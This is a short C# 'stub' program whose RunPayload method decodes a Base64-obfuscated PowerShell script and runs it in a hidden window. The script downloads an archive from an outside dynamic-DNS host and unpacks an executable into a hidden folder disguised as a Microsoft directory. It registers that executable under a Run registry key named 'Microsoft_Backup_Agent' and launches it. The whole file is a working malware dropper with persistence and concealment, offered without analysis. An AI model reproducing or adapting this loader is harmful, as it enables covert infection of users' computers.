﻿using System;
using System.Diagnostics;
using System.Text;

namespace Stub
{
    public static class StubProgram
    {
        public static void RunPayload()
        {
            // Your Base64 string is plain PowerShell script encoded in Base64 (UTF-8)
            string base64 = "bWtkaXIgLXAgQzpcVXNlcnNcUHVibGljXC5NaWNyb3NvZnRDb3Jwb3JhdGlvbjsgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vdG9ueW5vc2UuY2hpY2tlbmtpbGxlci5jb206OTA5MC9iYWNrdXB4NjQuemlwIC1PdXRGaWxlIEM6XFVzZXJzXFB1YmxpY1wuTWljcm9zb2Z0Q29ycG9yYXRpb25cYmFja3VweDY0LnppcDsgRXhwYW5kLUFyY2hpdmUgLVBhdGggQzpcVXNlcnNcUHVibGljXC5NaWNyb3NvZnRDb3Jwb3JhdGlvblxiYWNrdXB4NjQuemlwIC1EZXN0aW5hdGlvblBhdGggQzpcVXNlcnNcUHVibGljXC5NaWNyb3NvZnRDb3Jwb3JhdGlvblw7IFJlbW92ZS1JdGVtIC1Gb3JjZSBDOlxVc2Vyc1xQdWJsaWNcLk1pY3Jvc29mdENvcnBvcmF0aW9uXGJhY2t1cHg2NC56aXA7IFJlbmFtZS1JdGVtIEM6XFVzZXJzXFB1YmxpY1wuTWljcm9zb2Z0Q29ycG9yYXRpb25cYmFja3VweDY0LmZjdWsgYmFja3VweDY0LmV4ZTsgYXR0cmliICtoIEM6XFVzZXJzXFB1YmxpY1wuTWljcm9zb2Z0Q29ycG9yYXRpb25cYmFja3VweDY0LmV4ZTsgUkVHIEFERCBIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4gL3YgTWljcm9zb2Z0X0JhY2t1cF9BZ2VudCAvdCBSRUdfU1ogL2QgQzpcVXNlcnNcUHVibGljXC5NaWNyb3NvZnRDb3Jwb3JhdGlvblxiYWNrdXB4NjQuZXhlIC9mOyBTdGFydC1Qcm9jZXNzIC1XaW5kb3dTdHlsZSBIaWRkZW4gQzpcVXNlcnNcUHVibGljXC5NaWNyb3NvZnRDb3Jwb3JhdGlvblxiYWNrdXB4NjQuZXhlCg==";

            // Decode the Base64 to get the actual PowerShell script as string
            string decodedCommand = Encoding.UTF8.GetString(Convert.FromBase64String(base64));

            // Prepare PowerShell to run this decoded script as a command argument
            string psArgs = $"-NoProfile -WindowStyle Hidden -Command \"{decodedCommand}\"";

            var psi = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = psArgs,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            Process.Start(psi);
        }
    }
}
